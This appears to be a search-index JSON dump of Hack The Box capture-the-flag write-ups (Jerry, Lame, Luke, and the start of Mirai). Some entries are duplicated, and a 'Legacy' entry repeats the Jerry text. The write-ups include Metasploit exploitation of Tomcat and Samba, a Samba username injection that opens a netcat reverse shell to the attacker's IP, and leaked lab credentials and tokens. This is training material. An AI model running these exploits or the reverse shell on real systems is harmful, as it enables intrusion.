multi/http/tomcat_mgr_upload which uses a POST to /manager/html/upload to get the payload on the server, there is another similar module called multi/http/tomcat_mgr_deploy which uses a PUT to upload the payload, from testing the deploy payload has given limited success, so I\u2019d suggest using the upload payload. We set our exploit by typing in use multi/http/tomcat_mgr_upload . We then configure our exploit with the login credentials, the host, the payload, and the target. Once that is all set up all we need to do type is exploit , fingers-crossed! Ta-da! I drop into a shell, and\u2026 what? I guess we\u2019re already System, that was easy! After we navigate to the Administrator\u2019s desktop, we find a directory named flags, which contains a text file called 2 for the price of 1.txt , which contains both of the flags we need to submit. Part 2: Root Well, we already have System, and the root flag, so this section is pretty useless. Jerry was my first own on HTB, mainly because it was rated as \u2018Piece of cake\u2019 by a large majority of those who owned it. And, whilst it\u2019s pretty easy (Especially because you get System as soon as you get a shell!), we all start somewhere.","title":"2. Jerry Writeup.md"},{"location":"Retired/Jerry Writeup/#hack-the-box-jerry-write-up","text":"This is my write-up for the \u2018Jerry\u2019 box found on Hack The Box . In short: Default credentials and authenticated RCE using metasploit module, Apache was running as root so no privilege escalation required.","title":"Hack The Box \u2014 Jerry Write-up"},{"location":"Retired/Jerry Writeup/#part-1-user","text":"The information we start with is that it\u2019s IP is 10.10.10.95, and it runs Windows. Of course, this is hardly enough information! So we use nmap to see what this machine has to offer. We see that it\u2019s running Apache Tomcat on port 8080, so our first instinct would be to visit the page. Manager App sounds interesting! Looks like we need login information, or we could just try \u2018admin\u2019 and \u2018admin\u2019? Well, something happened. If we have a read of this, we can see it\u2019s showing us how to set up an account that can access the Manager App, with the username \u2018tomcat\u2019 and the password \u2018s3cret\u2019. So we tried \u2018admin\u2019 and \u2018admin\u2019, it didn\u2019t work, but we are presented with new login credentials now, so let\u2019s try them! However we\u2019re already logged in, so I quickly close Firefox and open it again, this will wipe the cookies as we\u2019re in Private Browsing mode, thus logging us out. We then log back in with the new credentials and\u2026 This looks promising! Let\u2019s have a gander at what we can do. Some of these names don\u2019t look standard, indicating that this may be our way to getting user access. Scrolling further down, we see the reason for the strangely named apps. There\u2019s an option to upload a WAR file, which is basically a JAR file for web apps. This sounds like our vulnerability to me, so we go to our best friend Google. After chucking some random words together, we come across an exploit that makes use of authenticated upload, so the next step is to load up msfconsole Side note: The module I\u2019m using is multi/http/tomcat_mgr_upload which uses a POST to /manager/html/upload to get the payload on the server, there is another similar module called multi/http/tomcat_mgr_deploy which uses a PUT to upload the payload, from testing the deploy payload has given limited success, so I\u2019d suggest using the upload payload. We set our exploit by typing in use multi/http/tomcat_mgr_upload . We then configure our exploit with the login credentials, the host, the payload, and the target. Once that is all set up all we need to do type is exploit , fingers-crossed! Ta-da! I drop into a shell, and\u2026 what? I guess we\u2019re already System, that was easy! After we navigate to the Administrator\u2019s desktop, we find a directory named flags, which contains a text file called 2 for the price of 1.txt , which contains both of the flags we need to submit.","title":"Part 1: User"},{"location":"Retired/Jerry Writeup/#part-2-root","text":"Well, we already have System, and the root flag, so this section is pretty useless. Jerry was my first own on HTB, mainly because it was rated as \u2018Piece of cake\u2019 by a large majority of those who owned it. And, whilst it\u2019s pretty easy (Especially because you get System as soon as you get a shell!), we all start somewhere.","title":"Part 2: Root"},{"location":"Retired/Lame Writeup/","text":"HackTheBox Write-Up \u2014 Lame This is the write-up of the Machine LAME from HackTheBox . DIGEST Lame is a beginner-friendly machine based on a Linux platform. It was the first machine from HTB.Use the samba username map script vulnerability to gain user and root. Machine Author: ch4p Machine Type: Linux Machine Level: 2.7/10 Know-How Nmap Searchsploit Absorb Skills CVE-2007\u20132447 Samba \u201cusername map script\u201d Command Execution Scanning the Network $nmap -sC -sV 10.10.10.3 Vulnerable Ftp searchsploit vsftpd 2.3.4 I tried to execute the exploit but it failed every time :( Vulnerable Samba This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default \u201cusername map script\u201d configuration option. By specifying a username containing shell mmeta characters attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames pbeforeauthentication!. $searchsploit Samba 3.0.20 Exploiting the Server msf5 use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 exploit Manual Exploit Without Metasploit logon \u201c./=`nohup nc -e /bin/bash 10.10.14.7 4444` logon:- it is used to login into smb nohup:-run a command immune to hangups, with output to a non-tty OWN USER User makis have the user.txt OWN ROOT","title":"36. Lame Writeup.md"},{"location":"Retired/Lame Writeup/#hackthebox-write-up-lame","text":"This is the write-up of the Machine LAME from HackTheBox .","title":"HackTheBox Write-Up \u2014 Lame"},{"location":"Retired/Lame Writeup/#digest","text":"Lame is a beginner-friendly machine based on a Linux platform. It was the first machine from HTB.Use the samba username map script vulnerability to gain user and root. Machine Author: ch4p Machine Type: Linux Machine Level: 2.7/10","title":"DIGEST"},{"location":"Retired/Lame Writeup/#know-how","text":"Nmap Searchsploit","title":"Know-How"},{"location":"Retired/Lame Writeup/#absorb-skills","text":"CVE-2007\u20132447 Samba \u201cusername map script\u201d Command Execution","title":"Absorb Skills"},{"location":"Retired/Lame Writeup/#scanning-the-network","text":"$nmap -sC -sV 10.10.10.3","title":"Scanning the Network"},{"location":"Retired/Lame Writeup/#vulnerable-ftp","text":"searchsploit vsftpd 2.3.4 I tried to execute the exploit but it failed every time :(","title":"Vulnerable Ftp"},{"location":"Retired/Lame Writeup/#vulnerable-samba","text":"This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default \u201cusername map script\u201d configuration option. By specifying a username containing shell mmeta characters attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames pbeforeauthentication!. $searchsploit Samba 3.0.20","title":"Vulnerable Samba"},{"location":"Retired/Lame Writeup/#exploiting-the-server","text":"msf5 use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 exploit","title":"Exploiting the Server"},{"location":"Retired/Lame Writeup/#manual-exploit-without-metasploit","text":"logon \u201c./=`nohup nc -e /bin/bash 10.10.14.7 4444` logon:- it is used to login into smb nohup:-run a command immune to hangups, with output to a non-tty","title":"Manual Exploit Without Metasploit"},{"location":"Retired/Lame Writeup/#own-user","text":"User makis have the user.txt","title":"OWN USER"},{"location":"Retired/Lame Writeup/#own-root","text":"","title":"OWN ROOT"},{"location":"Retired/Legacy Writeup/","text":"Hack The Box \u2014 Jerry Write-up This is my write-up for the \u2018Jerry\u2019 box found on Hack The Box . In short: Default credentials and authenticated RCE using metasploit module, Apache was running as root so no privilege escalation required. Part 1: User The information we start with is that it\u2019s IP is 10.10.10.95, and it runs Windows. Of course, this is hardly enough information! So we use nmap to see what this machine has to offer. We see that it\u2019s running Apache Tomcat on port 8080, so our first instinct would be to visit the page. Manager App sounds interesting! Looks like we need login information, or we could just try \u2018admin\u2019 and \u2018admin\u2019? Well, something happened. If we have a read of this, we can see it\u2019s showing us how to set up an account that can access the Manager App, with the username \u2018tomcat\u2019 and the password \u2018s3cret\u2019. So we tried \u2018admin\u2019 and \u2018admin\u2019, it didn\u2019t work, but we are presented with new login credentials now, so let\u2019s try them! However we\u2019re already logged in, so I quickly close Firefox and open it again, this will wipe the cookies as we\u2019re in Private Browsing mode, thus logging us out. We then log back in with the new credentials and\u2026 This looks promising! Let\u2019s have a gander at what we can do. Some of these names don\u2019t look standard, indicating that this may be our way to getting user access. Scrolling further down, we see the reason for the strangely named apps. There\u2019s an option to upload a WAR file, which is basically a JAR file for web apps. This sounds like our vulnerability to me, so we go to our best friend Google. After chucking some random words together, we come across an exploit that makes use of authenticated upload, so the next step is to load up msfconsole Side note: The module I\u2019m using is multi/http/tomcat_mgr_upload which uses a POST to /manager/html/upload to get the payload on the server, there is another similar module called multi/http/tomcat_mgr_deploy which uses a PUT to upload the payload, from testing the deploy payload has given limited success, so I\u2019d suggest using the upload payload. We set our exploit by typing in use multi/http/tomcat_mgr_upload . We then configure our exploit with the login credentials, the host, the payload, and the target. Once that is all set up all we need to do type is exploit , fingers-crossed! Ta-da! I drop into a shell, and\u2026 what? I guess we\u2019re already System, that was easy! After we navigate to the Administrator\u2019s desktop, we find a directory named flags, which contains a text file called 2 for the price of 1.txt , which contains both of the flags we need to submit. Part 2: Root Well, we already have System, and the root flag, so this section is pretty useless. Jerry was my first own on HTB, mainly because it was rated as \u2018Piece of cake\u2019 by a large majority of those who owned it. And, whilst it\u2019s pretty easy (Especially because you get System as soon as you get a shell!), we all start somewhere. Keep an eye out for my future write-ups!","title":"18. Legacy Writeup.md"},{"location":"Retired/Legacy Writeup/#hack-the-box-jerry-write-up","text":"This is my write-up for the \u2018Jerry\u2019 box found on Hack The Box . In short: Default credentials and authenticated RCE using metasploit module, Apache was running as root so no privilege escalation required.","title":"Hack The Box \u2014 Jerry Write-up"},{"location":"Retired/Legacy Writeup/#part-1-user","text":"The information we start with is that it\u2019s IP is 10.10.10.95, and it runs Windows. Of course, this is hardly enough information! So we use nmap to see what this machine has to offer. We see that it\u2019s running Apache Tomcat on port 8080, so our first instinct would be to visit the page. Manager App sounds interesting! Looks like we need login information, or we could just try \u2018admin\u2019 and \u2018admin\u2019? Well, something happened. If we have a read of this, we can see it\u2019s showing us how to set up an account that can access the Manager App, with the username \u2018tomcat\u2019 and the password \u2018s3cret\u2019. So we tried \u2018admin\u2019 and \u2018admin\u2019, it didn\u2019t work, but we are presented with new login credentials now, so let\u2019s try them! However we\u2019re already logged in, so I quickly close Firefox and open it again, this will wipe the cookies as we\u2019re in Private Browsing mode, thus logging us out. We then log back in with the new credentials and\u2026 This looks promising! Let\u2019s have a gander at what we can do. Some of these names don\u2019t look standard, indicating that this may be our way to getting user access. Scrolling further down, we see the reason for the strangely named apps. There\u2019s an option to upload a WAR file, which is basically a JAR file for web apps. This sounds like our vulnerability to me, so we go to our best friend Google. After chucking some random words together, we come across an exploit that makes use of authenticated upload, so the next step is to load up msfconsole Side note: The module I\u2019m using is multi/http/tomcat_mgr_upload which uses a POST to /manager/html/upload to get the payload on the server, there is another similar module called multi/http/tomcat_mgr_deploy which uses a PUT to upload the payload, from testing the deploy payload has given limited success, so I\u2019d suggest using the upload payload. We set our exploit by typing in use multi/http/tomcat_mgr_upload . We then configure our exploit with the login credentials, the host, the payload, and the target. Once that is all set up all we need to do type is exploit , fingers-crossed! Ta-da! I drop into a shell, and\u2026 what? I guess we\u2019re already System, that was easy! After we navigate to the Administrator\u2019s desktop, we find a directory named flags, which contains a text file called 2 for the price of 1.txt , which contains both of the flags we need to submit.","title":"Part 1: User"},{"location":"Retired/Legacy Writeup/#part-2-root","text":"Well, we already have System, and the root flag, so this section is pretty useless. Jerry was my first own on HTB, mainly because it was rated as \u2018Piece of cake\u2019 by a large majority of those who owned it. And, whilst it\u2019s pretty easy (Especially because you get System as soon as you get a shell!), we all start somewhere.","title":"Part 2: Root"},{"location":"Retired/Legacy Writeup/#keep-an-eye-out-for-my-future-write-ups","text":"","title":"Keep an eye out for my future write-ups!"},{"location":"Retired/Luke Writeup/","text":"This is a write-up on how i solved Luke from HacktheBox. Hack the Box is an online platform where you practice your penetration testing skills. As always, I try to explain how I understood the concepts here from the machine because I want to really understand how things work. So please, if I misunderstood a concept, please let me know. About the box Luke is rated medium difficulty, and it\u2019s OS is FreeBSD. I think it\u2019s passable as an easy box as it\u2019s fairly short and simple. When I solved this, I forgot that this was a medium difficulty box, but realized that it will be quite difficult if you don\u2019t enumerate properly. Also, for me, the box\u2019s required approach is new compared to the active machines at the time this was released but as all HTB machines, there is something to learn from here. #TLDR **Initial foothold:** Through enumeration, found details for credentials to authenticate to get a JWT. **Root:** Using the generated JWT to list more credentials from port 3000 and accessing Ajenti Server Admin Panel, reading root.txt and user.txt #Initial Foothold As usual, I run an nmap scan, saving it to my Nnmap directory: nmap -sV -sC -oA nmap/initial 10.10.10.137 The output is: Nmap scan report for 10.10.10.137 Host is up (0.27s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.13.22 | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |_http-title: Luke 1310/tcp filtered husky 3000/tcp open http Node.js Express framework |_http-title: Site doesn t have a title (application/json; charset=utf-8). 3003/tcp filtered cgms 8000/tcp open http Ajenti http control panel |_http-title: Ajenti 19315/tcp filtered keyshadow 45100/tcp filtered unknown Open services are FTP, SSH(?), http, Node.js and Ajenti. I first check FTP. FTP I found a file called for_Chihiro.txt. I download it and read its contents: Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry It seems it\u2019s a note from Derry to Chihiro, implying that he/she can access the sources of the website, but the access will be deleted soon. I check HTTP next. HTTP The landing page gives us a website template. After playing with it, I found nothing interesting in the website. Since there is no sign or warning not to brute force, I ran dirsearch. dirsearch.py -u [http://10.10.10.137](http://10.10.10.137) -e php Dirsearch is a python tool that brute forces directories and files in a website. You can find it here, since if I remember correctly, it is not preinstalled in Kali. https://github.com/maurosoria/dirsearch Checking the paths found: config.php $dbHost = localhost ; $dbUsername = root ; $dbPassword = Zk6heYCyv6ZE9Xcg ; $db = login ; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die( Connect failed: %s\\n . $conn - error); It seems it\u2019s made to look like an error which was probably intended. It gives us info of possible db credentials. /login.php This gives us a login page. Trying the credentials from config.php: /management There seems to be a management page. The credentials from the config.php doesn\u2019t work on this also. Port 8000(Ajenti) The last open service is Ajenti. The credentials doesn\u2019t work on this also. Port 3000(Node.js) Visiting port 3000, I find this: It seems that it requires of us an Auth token. I remember that when I first solved this box, it took me time to understand how to interact with Node.js. I run dirsearch.py on port 3000 to enumerate further. dirsearch.py -u [http://10.10.10.137:3000](http://10.10.10.137:3000) -e json I find /users/admin path. It is important to note that the credentials from config.php has a username of root, and not admin. Since it requires us JWT to authenticate, I then searched on how to do it. Authenticating For us to access the json data, we first need to authenticate by getting a valid JWT(json web tokens). You can learn more about how it works here: https://jwt.io/ . We can use cURL to get a valid JWT from our data using the syntax below(many ways to do this afaik). I use -s to not show the progress bar, -X request method, and -H for headers, and\u200a\u2014\u200adata for the payload: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : root , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) Forbidden# I get a \u201cForbidden\u201d as the response. It seems that the credentials are not valid or we don\u2019t have privilege to access this. After thinking some time and looking at what I have, I remember that there is a /users/admin path. Deducting that an admin user is valid, I tried changing root to admin: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) { success :true, message : Authentication successful! , token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxMzEwLCJleHAiOjE1Njg1Mzc3MTB9.sP-q66lsXIsSs8jhYhvM6giOVvwABmmEJYoYl054gbc } I then get a \u201csuccess:true\u201d. So the valid credentials are admin:Zk6heYCyv6ZE9Xcg. Using jq I then used a tool called jq. It is a tool to make json outputs much more \u201cviewable\u201d and \u201cmanageable\u201d. Read more about how you can use it here: You Need To Know jq jq is such a nifty tool that not nealry enough people know about. If you're working with json data, even just small bits here and there, it's worth knowing the basics to make some simple data manipulations possible. And if you want to become a full on jq wizard, all the better. Using jq, the output will look like this: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq { success : true, message : Authentication successful! , token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNDkwLCJleHAiOjE1Njg1Mzc4OTB9.pTGePScCFa4gFXNj9Gjfc9RqZfLwMBKtGY_HyfuULa0 } Filtering the value \u201ctoken\u201d: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq .token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNTQzLCJleHAiOjE1Njg1Mzc5NDN9.PQlVYZfOkIRGnBMnpb6jDeV5F9g86ttccgrApZoC_xQ You can then create a bash script to simplify and store it in a variable, but it\u2019s not that important in this case. Here\u2019s how it looks from the terminal: JWT\u2019s payload part can be decoded. You can learn more about how it is encoded and what are its parts(that\u2019s your homework). Basically, it looks like this side by side(using jwt.io): Now that we have a valid JWT, accessing the port 3000 gives us this response: curl -s -H Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxOTg3LCJleHAiOjE1Njg1MzgzODd9.qC0H5LCBtZQCbgadv5BlAy8_AojNnMs5wY2We6pJmBI [http://10.10.10.137:3000](http://10.10.10.137:3000) | jq { message : Welcome admin ! } A welcome banner as admin is presented. Enumerating users Accessing 10.10.10.137:3000/users using the JWT gives us this output: [ { ID : 1 , name : Admin , Role : Superuser }, { ID : 2 , name : Derry , Role : Web Admin }, { ID : 3 , name : Yuri , Role : Beta Tester }, { ID : 4 , name : Dory , Role : Supporter } ] /users/admin { name : Admin , password : WX5b7) /rp$U)FW } Since from our previous enumeration, there exists a /users/admin, we can try /users/\u201dname\u201d from the json output. /users/derry { name : Derry , password : rZ86wwLvx7jUxtch } /users/yuri { name : Yuri , password : bet@tester87 } /users/dory { name : Dory , password : 5y:!xa=ybfe)/QD } I now have many credentials to try. After trying to them to the services and login pages, only one of them worked for me. Using Derry creds: I accessed /management, and reviewing our notes (for_Chihiro.txt): Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry Derry is a web admin(also from the json output). Using it to access /management: I get access to management. What\u2019s new here is the config.json file. Getting Root(and User): Checking the config.json, I see a password which seems looks like will work for the user root. **root:KpMasng6S5EtTy9Z** Accessing 10.10.10.137:8000: Since Ajenti is a GUI for server management tasks, I can look into functions that I can leverage. Under the tools section, Ajenti allows me to open a terminal. Since I verify if I have root access, I run id. I am running as root, and therefore can read root.txt and user.txt.. So that\u2019s how I solved Luke from Hack the Box. After spending some time playing with what I can do from the shell, to find how I can SSH, I wasn\u2019t able to. I also learned that the location of http is different(not on /var/www/html commonly on Linux), and account password hashes are stored on /etc/master.passwd rather than the usual /etc/shadow. I also tried cracking Derry\u2019s password hash but wasn\u2019t able to(just used rockyou.txt).","title":"22. Luke Writeup.md"},{"location":"Retired/Luke Writeup/#about-the-box","text":"Luke is rated medium difficulty, and it\u2019s OS is FreeBSD. I think it\u2019s passable as an easy box as it\u2019s fairly short and simple. When I solved this, I forgot that this was a medium difficulty box, but realized that it will be quite difficult if you don\u2019t enumerate properly. Also, for me, the box\u2019s required approach is new compared to the active machines at the time this was released but as all HTB machines, there is something to learn from here.","title":"About the box"},{"location":"Retired/Luke Writeup/#tldr","text":"**Initial foothold:** Through enumeration, found details for credentials to authenticate to get a JWT. **Root:** Using the generated JWT to list more credentials from port 3000 and accessing Ajenti Server Admin Panel, reading root.txt and user.txt","title":"#TLDR"},{"location":"Retired/Luke Writeup/#initial-foothold","text":"As usual, I run an nmap scan, saving it to my Nnmap directory: nmap -sV -sC -oA nmap/initial 10.10.10.137 The output is: Nmap scan report for 10.10.10.137 Host is up (0.27s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.13.22 | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |_http-title: Luke 1310/tcp filtered husky 3000/tcp open http Node.js Express framework |_http-title: Site doesn t have a title (application/json; charset=utf-8). 3003/tcp filtered cgms 8000/tcp open http Ajenti http control panel |_http-title: Ajenti 19315/tcp filtered keyshadow 45100/tcp filtered unknown Open services are FTP, SSH(?), http, Node.js and Ajenti. I first check FTP.","title":"#Initial Foothold"},{"location":"Retired/Luke Writeup/#ftp","text":"I found a file called for_Chihiro.txt. I download it and read its contents: Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry It seems it\u2019s a note from Derry to Chihiro, implying that he/she can access the sources of the website, but the access will be deleted soon. I check HTTP next.","title":"FTP"},{"location":"Retired/Luke Writeup/#http","text":"The landing page gives us a website template. After playing with it, I found nothing interesting in the website. Since there is no sign or warning not to brute force, I ran dirsearch. dirsearch.py -u [http://10.10.10.137](http://10.10.10.137) -e php Dirsearch is a python tool that brute forces directories and files in a website. You can find it here, since if I remember correctly, it is not preinstalled in Kali. https://github.com/maurosoria/dirsearch Checking the paths found:","title":"HTTP"},{"location":"Retired/Luke Writeup/#configphp","text":"$dbHost = localhost ; $dbUsername = root ; $dbPassword = Zk6heYCyv6ZE9Xcg ; $db = login ; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die( Connect failed: %s\\n . $conn - error); It seems it\u2019s made to look like an error which was probably intended. It gives us info of possible db credentials.","title":"config.php"},{"location":"Retired/Luke Writeup/#loginphp","text":"This gives us a login page. Trying the credentials from config.php:","title":"/login.php"},{"location":"Retired/Luke Writeup/#management","text":"There seems to be a management page. The credentials from the config.php doesn\u2019t work on this also.","title":"/management"},{"location":"Retired/Luke Writeup/#port-8000ajenti","text":"The last open service is Ajenti. The credentials doesn\u2019t work on this also.","title":"Port 8000(Ajenti)"},{"location":"Retired/Luke Writeup/#port-3000nodejs","text":"Visiting port 3000, I find this: It seems that it requires of us an Auth token. I remember that when I first solved this box, it took me time to understand how to interact with Node.js. I run dirsearch.py on port 3000 to enumerate further. dirsearch.py -u [http://10.10.10.137:3000](http://10.10.10.137:3000) -e json I find /users/admin path. It is important to note that the credentials from config.php has a username of root, and not admin. Since it requires us JWT to authenticate, I then searched on how to do it.","title":"Port 3000(Node.js)"},{"location":"Retired/Luke Writeup/#authenticating","text":"For us to access the json data, we first need to authenticate by getting a valid JWT(json web tokens). You can learn more about how it works here: https://jwt.io/ . We can use cURL to get a valid JWT from our data using the syntax below(many ways to do this afaik). I use -s to not show the progress bar, -X request method, and -H for headers, and\u200a\u2014\u200adata for the payload: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : root , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) Forbidden# I get a \u201cForbidden\u201d as the response. It seems that the credentials are not valid or we don\u2019t have privilege to access this. After thinking some time and looking at what I have, I remember that there is a /users/admin path. Deducting that an admin user is valid, I tried changing root to admin: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) { success :true, message : Authentication successful! , token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxMzEwLCJleHAiOjE1Njg1Mzc3MTB9.sP-q66lsXIsSs8jhYhvM6giOVvwABmmEJYoYl054gbc } I then get a \u201csuccess:true\u201d. So the valid credentials are admin:Zk6heYCyv6ZE9Xcg.","title":"Authenticating"},{"location":"Retired/Luke Writeup/#using-jq","text":"I then used a tool called jq. It is a tool to make json outputs much more \u201cviewable\u201d and \u201cmanageable\u201d. Read more about how you can use it here: You Need To Know jq jq is such a nifty tool that not nealry enough people know about. If you're working with json data, even just small bits here and there, it's worth knowing the basics to make some simple data manipulations possible. And if you want to become a full on jq wizard, all the better. Using jq, the output will look like this: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq { success : true, message : Authentication successful! , token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNDkwLCJleHAiOjE1Njg1Mzc4OTB9.pTGePScCFa4gFXNj9Gjfc9RqZfLwMBKtGY_HyfuULa0 } Filtering the value \u201ctoken\u201d: curl -s -X POST -H Accept: application/json -H Content-Type: application/json --data { username : admin , password : Zk6heYCyv6ZE9Xcg } [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq .token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNTQzLCJleHAiOjE1Njg1Mzc5NDN9.PQlVYZfOkIRGnBMnpb6jDeV5F9g86ttccgrApZoC_xQ You can then create a bash script to simplify and store it in a variable, but it\u2019s not that important in this case. Here\u2019s how it looks from the terminal: JWT\u2019s payload part can be decoded. You can learn more about how it is encoded and what are its parts(that\u2019s your homework). Basically, it looks like this side by side(using jwt.io): Now that we have a valid JWT, accessing the port 3000 gives us this response: curl -s -H Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxOTg3LCJleHAiOjE1Njg1MzgzODd9.qC0H5LCBtZQCbgadv5BlAy8_AojNnMs5wY2We6pJmBI [http://10.10.10.137:3000](http://10.10.10.137:3000) | jq { message : Welcome admin ! } A welcome banner as admin is presented.","title":"Using jq"},{"location":"Retired/Luke Writeup/#enumerating-users","text":"Accessing 10.10.10.137:3000/users using the JWT gives us this output: [ { ID : 1 , name : Admin , Role : Superuser }, { ID : 2 , name : Derry , Role : Web Admin }, { ID : 3 , name : Yuri , Role : Beta Tester }, { ID : 4 , name : Dory , Role : Supporter } ]","title":"Enumerating users"},{"location":"Retired/Luke Writeup/#usersadmin","text":"{ name : Admin , password : WX5b7) /rp$U)FW } Since from our previous enumeration, there exists a /users/admin, we can try /users/\u201dname\u201d from the json output.","title":"/users/admin"},{"location":"Retired/Luke Writeup/#usersderry","text":"{ name : Derry , password : rZ86wwLvx7jUxtch }","title":"/users/derry"},{"location":"Retired/Luke Writeup/#usersyuri","text":"{ name : Yuri , password : bet@tester87 }","title":"/users/yuri"},{"location":"Retired/Luke Writeup/#usersdory","text":"{ name : Dory , password : 5y:!xa=ybfe)/QD } I now have many credentials to try. After trying to them to the services and login pages, only one of them worked for me.","title":"/users/dory"},{"location":"Retired/Luke Writeup/#using-derry-creds","text":"I accessed /management, and reviewing our notes (for_Chihiro.txt): Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry Derry is a web admin(also from the json output). Using it to access /management: I get access to management. What\u2019s new here is the config.json file.","title":"Using Derry creds:"},{"location":"Retired/Luke Writeup/#getting-rootand-user","text":"Checking the config.json, I see a password which seems looks like will work for the user root. **root:KpMasng6S5EtTy9Z** Accessing 10.10.10.137:8000: Since Ajenti is a GUI for server management tasks, I can look into functions that I can leverage. Under the tools section, Ajenti allows me to open a terminal. Since I verify if I have root access, I run id. I am running as root, and therefore can read root.txt and user.txt.. So that\u2019s how I solved Luke from Hack the Box. After spending some time playing with what I can do from the shell, to find how I can SSH, I wasn\u2019t able to. I also learned that the location of http is different(not on /var/www/html commonly on Linux), and account password hashes are stored on /etc/master.passwd rather than the usual /etc/shadow. I also tried cracking Derry\u2019s password hash but wasn\u2019t able to(just used rockyou.txt).","title":"Getting Root(and User):"},{"location":"Retired/Mirai Writeup/","text":"Hello friends!! Today we are going to solve another CTF challenge \u201c Mirai \u201d which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can\u2019t submit a write-up of any Active lab, therefore, we have chosen retried Mirai lab. Level: Intermediate Task: find user.txt and root.txt file in the victim\u2019s machine. Let\u2019s Breach!!! Lab IP: 10.10.10.48 Firstly let\u2019s enumerate ports in context to identify running services and open ports of victim\u2019s machine by using the most popular tool Nmap. nmap -p- -A 10.10.10.48 --open Awesome!! Nmap has done a remarkable job by dumping the details of services running on open port 22 53, 80, 1031, 32400, 32469. Without wasting time I used the dirb tool of Kali to enumerate the directories and found some important directories such as /admin/ So next I decided to explore http://10.10.10.48/admin through browser URL. Here we have a Login Page, Lets Go through That. When I link on login tab I saw following web page. The Pi-hole and the 